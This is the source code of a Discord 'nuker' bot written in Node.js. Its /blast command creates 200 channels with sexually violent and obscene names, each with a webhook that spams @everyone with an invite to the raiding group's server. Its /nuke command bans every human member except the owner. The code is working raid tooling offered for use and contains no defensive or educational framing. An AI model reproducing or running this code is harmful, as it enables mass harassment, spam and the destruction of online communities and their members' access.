require('dotenv').config();
const express = require('express');
const {
  Client,
  GatewayIntentBits,
  Partials,
  SlashCommandBuilder,
  REST,
  Routes,
  PermissionFlagsBits,
  ChannelType,
} = require('discord.js');

const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (_, res) => res.send('Bot is online'));
app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

client.once('ready', async () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);

  // Register slash commands globally
  const commands = [
    new SlashCommandBuilder()
      .setName('blast')
      .setDescription('Create 200 channels + webhooks and ping everyone instantly')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all non-bot members except owner')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('✅ Slash commands registered globally');
  } catch (error) {
    console.error('Error registering commands:', error);
  }
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  if (!interaction.guild) return interaction.reply({ content: '❌ Use commands in a server.', ephemeral: true });

  if (interaction.user.id !== process.env.OWNER_ID) {
    return interaction.reply({ content: '❌ You are not authorized.', ephemeral: true });
  }

  if (interaction.commandName === 'blast') {
    await interaction.reply('🚀 Creating 200 channels and webhooks...');

    const promises = [];
    for (let i = 1; i <= 200; i++) {
      promises.push(
        (async () => {
          try {
            const channel = await interaction.guild.channels.create({
              name: `raped-by-vanir`,
              type: ChannelType.GuildText,
            });

            const webhook = await channel.createWebhook({
              name: `getfucked`,
              avatar: client.user.displayAvatarURL(),
            });

            await webhook.send({
              content: '@everyone https://discord.gg/vanir',
              allowedMentions: { parse: ['everyone'] },
            });

            console.log(`✅ Created and pinged vanir-${i}`);
          } catch (e) {
            console.error(`❌ Error on vanir-${i}: ${e.message}`);
          }
        })()
      );
    }

    await Promise.allSettled(promises);
    interaction.followUp('✅ Blast complete.');
  }

  if (interaction.commandName === 'nuke') {
    await interaction.reply('💣 Banning all non-bot members except owner...');

    const members = await interaction.guild.members.fetch();
    const bans = [];

    members.forEach((member) => {
      if (member.user.bot || member.id === process.env.OWNER_ID) return;
      bans.push(
        member.ban({ reason: 'Nuke command' }).then(() => {
          console.log(`🔨 Banned ${member.user.tag}`);
        }).catch((e) => {
          console.error(`❌ Failed to ban ${member.user.tag}: ${e.message}`);
        })
      );
    });

    await Promise.allSettled(bans);
    interaction.followUp('✅ Nuke complete.');
  }
});

process.on('unhandledRejection', (err) => console.error('UnhandledRejection:', err));
process.on('uncaughtException', (err) => console.error('UncaughtException:', err));

client.login(process.env.TOKEN);
